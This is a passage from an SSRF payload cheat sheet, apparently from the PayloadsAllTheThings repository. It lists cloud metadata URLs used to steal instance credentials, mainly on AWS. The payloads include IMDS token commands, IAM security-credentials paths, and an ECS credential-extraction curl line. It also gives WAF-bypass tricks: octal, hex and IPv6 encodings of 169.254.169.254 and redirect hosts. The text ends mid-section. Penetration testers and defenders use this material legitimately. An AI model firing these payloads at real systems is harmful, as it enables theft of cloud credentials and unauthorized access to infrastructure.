<!-- source: Server Side Request Forgery/SSRF-Cloud-Instances.md | chunk 1/3 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->


# SSRF URL for Cloud Instances

> When exploiting Server-Side Request Forgery (SSRF) in cloud environments, attackers often target metadata endpoints to retrieve sensitive instance information (e.g., credentials, configurations). Below is a categorized list of common URLs for various cloud and infrastructure providers

## Summary

* [SSRF URL for AWS Bucket](#ssrf-url-for-aws)
* [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
* [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
* [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
* [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
* [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
* [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
* [SSRF URL for Azure](#ssrf-url-for-azure)
* [SSRF URL for OpenStack/RackSpace](#ssrf-url-for-openstackrackspace)
* [SSRF URL for HP Helion](#ssrf-url-for-hp-helion)
* [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)
* [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)
* [SSRF URL for Alibaba](#ssrf-url-for-alibaba)
* [SSRF URL for Hetzner Cloud](#ssrf-url-for-hetzner-cloud)
* [SSRF URL for Docker](#ssrf-url-for-docker)
* [SSRF URL for Rancher](#ssrf-url-for-rancher)
* [References](#references)

## SSRF URL for AWS

The AWS Instance Metadata Service is a service available within Amazon EC2 instances that allows those instances to access metadata about themselves. - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)

* IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`
* IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`

  ```powershell
  export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
  ```

* IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/`

In case of a WAF, you might want to try different ways to connect to the API.

* DNS record pointing to the AWS API IP

  ```powershell
  http://instance-data
  http://169.254.169.254
  http://169.254.169.254.nip.io/
  ```

* HTTP redirect

  ```powershell
  Static:http://nicob.net/redir6a
  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
  ```

* Encoding the IP to bypass WAF

  ```powershell
  http://425.510.425.510 Dotted decimal with overflow
  http://2852039166 Dotless decimal
  http://7147006462 Dotless decimal with overflow
  http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
  http://0xA9FEA9FE Dotless hexadecimal
  http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
  http://0251.0376.0251.0376 Dotted octal
  http://0251.00376.000251.0000376 Dotted octal with padding
  http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
  http://[::ffff:a9fe:a9fe] IPV6 Compressed
  http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
  http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
  http://[fd00:ec2::254] IPV6
  ```

These URLs return a list of IAM roles associated with the instance. You can then append the role name to this URL to retrieve the security credentials for the role.

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
```

This URL is used to access the user data that was specified when launching the instance. User data is often used to pass startup scripts or other configuration information into the instance.

```powershell
http://169.254.169.254/latest/user-data
```

Other URLs to query to access various pieces of metadata about the instance, like the hostname, public IPv4 address, and other properties.

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Examples**:

* Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
* *Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`

## SSRF URL for AWS ECS

If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.

```powershell
curl http://169.254.170.2/v2/credentials/<UUID>
```

This way you'll extract IAM keys of the attached role

## SSRF URL for AWS Elastic Beanstalk

We retrieve the `accountId` and `region` from the API.

```powershell
